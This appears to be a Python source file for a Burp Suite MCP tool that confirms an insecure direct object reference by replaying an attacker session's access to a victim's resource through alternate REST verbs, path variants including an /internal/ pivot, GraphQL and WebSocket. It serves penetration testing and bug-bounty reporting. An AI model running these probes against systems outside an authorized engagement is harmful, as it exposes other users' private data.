"""probe_cross_transport_idor — verify IDOR via ≥2 transports.

Strix's confirmation bar: "same unauthorized access via ≥2 transports" makes
the finding hard to dispute. Given a known REST IDOR (path + ID + victim ID),
attempt to replay the same access via:

  - GraphQL (if a schema endpoint is reachable, build a query for the resource)
  - WebSocket (if a /ws or /socket.io endpoint is reachable, send a typed message)
  - Alternate REST verbs (HEAD / OPTIONS / GET-via-POST)
  - Alternate REST paths (singular vs plural, /v1 vs /v2, trailing slash)

Each successful replay tightens evidence. Pure black-box.
"""

import json

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


def _path_variants(path: str) -> list[str]:
    out = [path]
    # trailing-slash flip
    if path.endswith("/"):
        out.append(path.rstrip("/"))
    else:
        out.append(path + "/")
    # singular ↔ plural on second-to-last segment if it's not an ID
    segs = path.strip("/").split("/")
    if len(segs) >= 2:
        resource = segs[-2]
        if resource.endswith("s") and len(resource) > 3:
            singular = list(segs)
            singular[-2] = resource[:-1]
            out.append("/" + "/".join(singular))
        elif not resource.endswith("s"):
            plural = list(segs)
            plural[-2] = resource + "s"
            out.append("/" + "/".join(plural))
    # v1 ↔ v2
    for old, new in [("/v1/", "/v2/"), ("/v2/", "/v1/"), ("/api/v1/", "/api/v2/"), ("/api/v2/", "/api/v1/")]:
        if old in path:
            out.append(path.replace(old, new, 1))
    # Add an /internal/ pivot
    if "/api/" in path:
        out.append(path.replace("/api/", "/internal/", 1))
    return list(dict.fromkeys(out))  # dedupe preserving order


def _graphql_query(resource: str, victim_id: str) -> str:
    """Build a generic GraphQL query for `resource(id: "victim_id"){ id }`."""
    safe_id = victim_id.replace('"', '\\"')
    return json.dumps({
        "query": f'{{ {resource}(id: "{safe_id}") {{ id }} }}',
    })


def register(mcp: FastMCP):

    @mcp.tool()
    async def probe_cross_transport_idor(
        session: str,
        rest_path: str,
        victim_id: str,
        rest_method: str = "GET",
        graphql_endpoints: list[str] | None = None,
        ws_endpoints: list[str] | None = None,
        graphql_resource_name: str = "",
    ) -> str:
        """Replay a known REST IDOR across alternate transports / paths.

        Args:
            session: Auth session (attacker — should NOT own victim_id).
            rest_path: Confirmed-IDOR REST path. {victim_id} can appear literally; otherwise the path already contains victim_id.
            victim_id: Foreign user/resource ID that the session shouldn't access.
            rest_method: REST verb of the original finding.
            graphql_endpoints: Optional list of GraphQL endpoints to try (e.g. ['/graphql','/api/graphql']).
            ws_endpoints: Optional WS endpoints (e.g. ['/ws','/socket.io/']).
            graphql_resource_name: Resource name for the GraphQL query (e.g. 'user'/'order'). Required if graphql_endpoints set.
        """
        target_path = rest_path.replace("{victim_id}", victim_id) if "{victim_id}" in rest_path else rest_path

        # 1) Confirm REST baseline
        rest = await client.post("/api/session/request", json={
            "session": session, "method": rest_method, "path": target_path,
        })
        if "error" in rest:
            return f"Error confirming REST baseline: {rest['error']}"
        rest_status = rest.get("status", 0)
        rest_body = rest.get("response_body", "")

        rest_ok = 200 <= rest_status < 300
        lines = [
            f"probe_cross_transport_idor — victim_id={victim_id}",
            f"[REST baseline] {rest_method} {target_path}: status={rest_status} len={len(rest_body)} {'(CONFIRMED IDOR)' if rest_ok else '(NOT IDOR — re-verify)'}",
            "",
        ]
        if not rest_ok:
            lines.append("REST baseline does not confirm IDOR. Verify the finding before testing other transports.")
            return "\n".join(lines)

        confirmed_transports = 1  # REST
        transport_details: list[str] = ["REST"]

        # 2) Alternate REST verbs
        lines.append("[alt-verbs]")
        for verb in ("HEAD", "OPTIONS"):
            r = await client.post("/api/session/request", json={
                "session": session, "method": verb, "path": target_path,
            })
            if "error" in r:
                continue
            s = r.get("status", 0)
            tag = "ACCESSIBLE" if 200 <= s < 300 else f"denied({s})"
            lines.append(f"  {verb} {target_path}: status={s} {tag}")
            if 200 <= s < 300:
                confirmed_transports += 1
                transport_details.append(f"REST-{verb}")

        # 3) Alternate REST paths
        lines.append("[alt-paths]")
        for variant in _path_variants(target_path):
            if variant == target_path:
                continue
            r = await client.post("/api/session/request", json={
                "session": session, "method": rest_method, "path": variant,
            })
            if "error" in r:
                continue
            s = r.get("status", 0)
            ln = len(r.get("response_body", ""))
            if 200 <= s < 300:
                lines.append(f"  {rest_method} {variant}: status={s} len={ln} [ACCESSIBLE]")
                # only count if response body is non-trivially similar (avoid empty-200 false hits)
                if ln > 20:
                    confirmed_transports += 1
                    transport_details.append(f"REST-alt-path:{variant}")

        # 4) GraphQL
        if graphql_endpoints and graphql_resource_name:
            lines.append("[graphql]")
            gq = _graphql_query(graphql_resource_name, victim_id)
            for ep in graphql_endpoints:
                r = await client.post("/api/session/request", json={
                    "session": session, "method": "POST", "path": ep,
                    "headers": {"Content-Type": "application/json"},
                    "body": gq,
                })
                if "error" in r:
                    continue
                s = r.get("status", 0)
                body = r.get("response_body", "")
                if 200 <= s < 300 and victim_id in body and '"errors"' not in body:
                    lines.append(f"  POST {ep}: ACCESSIBLE (victim_id present in response, no errors)")
                    confirmed_transports += 1
                    transport_details.append(f"GraphQL:{ep}")
                elif 200 <= s < 300 and victim_id in body:
                    lines.append(f"  POST {ep}: status={s} len={len(body)} partial (victim_id present but errors block returned)")
                else:
                    lines.append(f"  POST {ep}: status={s} len={len(body)}")

        # 5) WebSocket
        if ws_endpoints:
            lines.append("[websocket]")
            for ep in ws_endpoints:
                # Use Java WS handler — attempt a connect+send+receive
                conn = await client.post("/api/websocket-send/connect", json={
                    "url": ep,
                    "session": session,
                })
                if "error" in conn:
                    lines.append(f"  {ep}: connect failed — {conn['error']}")
                    continue
                conn_id = conn.get("connection_id", "")
                # Send a generic typed message asking for the victim resource
                msg = json.dumps({"type": "get", "id": victim_id, "resource": graphql_resource_name or "resource"})
                send = await client.post("/api/websocket-send/send", json={
                    "connection_id": conn_id, "message": msg,
                })
                if "error" in send:
                    lines.append(f"  {ep}: send failed — {send['error']}")
                else:
                    received = send.get("received", "")
                    if victim_id in str(received):
                        lines.append(f"  {ep}: ACCESSIBLE (victim_id in response)")
                        confirmed_transports += 1
                        transport_details.append(f"WS:{ep}")
                    else:
                        lines.append(f"  {ep}: no leak (response: {str(received)[:120]})")
                # close
                await client.post("/api/websocket-send/close", json={"connection_id": conn_id})

        lines.append("\n--- Summary ---")
        lines.append(f"Confirmed transports: {confirmed_transports}")
        lines.append(f"  -> {', '.join(transport_details)}")
        if confirmed_transports >= 2:
            lines.append("\nEvidence bar: PASSED (≥2 transports). Finding is cross-channel — triagers cannot dismiss as 'only REST'.")
        else:
            lines.append("\nEvidence bar: REST-only. Try harder: search proxy history for GraphQL/WS endpoints with `search_history`.")
        return "\n".join(lines)
